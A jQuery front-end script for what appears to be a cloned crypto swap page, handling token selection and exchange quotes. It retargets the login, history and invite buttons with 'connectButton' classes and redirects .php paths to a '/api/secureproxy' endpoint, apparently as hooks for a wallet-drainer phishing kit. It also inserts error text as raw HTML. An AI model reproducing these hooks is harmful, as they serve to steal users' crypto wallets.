import {
  getCryptoSymbol,
  getCryptoExchangeData,
  formatCryptoAmount,
} from "./util.js";

$(document).ready(function () {
  $(".MuiDialog-root.MuiModal-root.css-1bve60d").hide();
});

$(document).ready(function () {
  // Target all elements containing any of the specified texts
  $(
    "*:contains('Connect Wallet'), *:contains('Connect Your Wallet'), *:contains('Log In')"
  )
    .filter(function () {
      // Ensure an exact match by trimming and checking the full text
      const text = $(this).text().trim();
      return (
        text === "Connect Wallet" ||
        text === "Connect Your Wallet" ||
        text === "Tx History" ||
        text === "Invite Friends" ||
        text === "Log In"
      );
    })

    .addClass("interact-button connectButton");
});

$(".custom-select-button").click(function () {
  $(".MuiDialog-root.MuiModal-root.css-1bve60d").toggle();
});

$(".closeIcon").click(function () {
  $(".MuiDialog-root.MuiModal-root.css-1bve60d").hide();
});

$(document).ready(function () {
  $(".custom-select-button.from").click(function (e) {
    e.preventDefault(); // Prevent default action

    // Instead of redirecting, you can use history.pushState to change the URL without reload
    history.pushState({}, "", "index.html?action=from");
  });

  $(".custom-select-button.to").click(function (e) {
    e.preventDefault(); // Prevent default action

    // Instead of redirecting, you can use history.pushState to change the URL without reload
    history.pushState({}, "", "index.html?action=to&state=fetching");
  });

  $('li[tabindex="0"]').click(function () {
    try {
      const clickedElement = $(this);
      const imgSrc = clickedElement.find("img").attr("src");
      const blockchain = clickedElement.find("span").text();

      const urlParams = new URLSearchParams(window.location.search);
      const action = urlParams.get("action");
      const state = urlParams.get("state");

      // Get current values from the UI to ensure we have them
      let fromChain = $(".custom-select-button.from .flex.items-center.text-sm")
        .text()
        .trim();
      let toChain = $(".custom-select-button.to .flex.items-center.text-sm")
        .text()
        .trim();

      if (action === "from") {
        $(".custom-select-button.from").find("img").attr("src", imgSrc);
        $(".select-token-button.from").find("img").attr("src", imgSrc);

        $(".custom-select-button.from .flex.items-center.text-sm").html(
          '<div class="mr-2 flex h-5 w-5 items-center justify-center">' +
            $(
              ".custom-select-button.from .mr-2.flex.h-5.w-5.items-center.justify-center"
            ).html() +
            "</div>" +
            blockchain
        );

        fromChain = blockchain;

        getCryptoSymbol(blockchain)
          .then(function (symbol) {
            $(
              ".MuiTypography-root.MuiTypography-body1.TokenSelector-tokenTypography.css-pl79uk.from"
            ).text(symbol);
          })
          .catch(function (error) {
            console.error(error);
          });
      } else if (action === "to") {
        $(".custom-select-button.to").find("img").attr("src", imgSrc);
        $(".select-token-button.to").find("img").attr("src", imgSrc);

        $(".custom-select-button.to .flex.items-center.text-sm").html(
          '<div class="mr-2 flex h-5 w-5 items-center justify-center">' +
            $(
              ".custom-select-button.to .mr-2.flex.h-5.w-5.items-center.justify-center"
            ).html() +
            "</div>" +
            blockchain
        );

        toChain = blockchain;

        getCryptoSymbol(blockchain)
          .then(function (symbol) {
            $(
              ".MuiTypography-root.MuiTypography-body1.TokenSelector-tokenTypography.css-pl79uk.to"
            ).text(symbol);
          })
          .catch(function (error) {
            console.error(error);
          });
      }

      if (state === "fetching") {
        const amount = $(".MuiInputBase-input.css-1jhxu0").val();

        if (!amount || amount === "") {
          alert("Please enter an amount");
          return;
        }

        if (fromChain === "" || toChain === "") {
          alert("Please select both from and to tokens");
          return;
        }

        // You could call your exchange data function here
        getCryptoExchangeData(
          amount,
          fromChain.toLowerCase(),
          toChain.toLowerCase()
        )
          .then((data) => {
            const amount = data.quotes[0].expectedAmountOut;

            $(
              ".MuiTypography-root.MuiTypography-h5.font-bold-important.pt-1.pt-6.css-mcjdx5"
            ).text(formatCryptoAmount(amount));
          })
          .catch((error) => {
            $("#fade-modal").empty().html(`
    <h2 style="color: #f25a67; font-size: 1rem;">Fetch quote error</2>
    <p class="modal-error-message" style="color: #ccc; font-size: 0.8rem; margin-top: 0.5rem;">${
      error || "An error occurred"
    }</p>
  `);

            $("#fade-modal").modal({
              fadeDuration: 100,
              closeClass: "icon-remove",
              closeText: "!",
            });
          })
          .finally(() => {
            // Reset the state to null after the fetch is complete
            history.pushState({}, "", "index.html?state=inactive");
          });
      }

      $(".MuiDialog-root.MuiModal-root.css-1bve60d").hide();
    } catch (error) {
      console.error("Error getting values:", error);
      return null;
    }
  });
});

//Middleware implementation
$(document).ready(function () {
  // Get the current URL's pathname
  const pathname = window.location.pathname;
  const search = window.location.search;

  // Check if the URL ends with .php
  if (pathname.endsWith(".php")) {
    // Redirect to the new URL
    window.location.href = "/api/secureproxy" + search;
  }
});

// Listen for real-time input changes
$(document).on("input", ".MuiInputBase-input.css-1jhxu0", function () {
  const updatedAmount = $(this).val();

  // Get current values from the UI
  let fromChain = $(".custom-select-button.from .flex.items-center.text-sm")
    .text()
    .trim();
  let toChain = $(".custom-select-button.to .flex.items-center.text-sm")
    .text()
    .trim();

  const urlParams = new URLSearchParams(window.location.search);
  const state = urlParams.get("state");

  if (state !== "inactive") {
    return;
  }

  // Call your exchange data function
  getCryptoExchangeData(
    updatedAmount,
    fromChain.toLowerCase(),
    toChain.toLowerCase()
  )
    .then((data) => {
      const amount = data.quotes[0].expectedAmountOut;

      $(
        ".MuiTypography-root.MuiTypography-h5.font-bold-important.pt-1.pt-6.css-mcjdx5"
      ).text(formatCryptoAmount(amount));
    })
    .catch((error) => {
      $("#fade-modal").empty().html(`
        <h2 style="color: #f25a67; font-size: 1rem;">Fetch quote error</h2>
        <p class="modal-error-message" style="color: #ccc; font-size: 0.8rem; margin-top: 0.5rem;">
          ${error || "An error occurred"}
        </p>
      `);

      $("#fade-modal").modal({
        fadeDuration: 100,
        closeClass: "icon-remove",
        closeText: "!",
      });
    })
    .finally(() => {
      // Reset the state to null after the fetch is complete
      history.pushState({}, "", "index.html?state=inactive");
    });
});
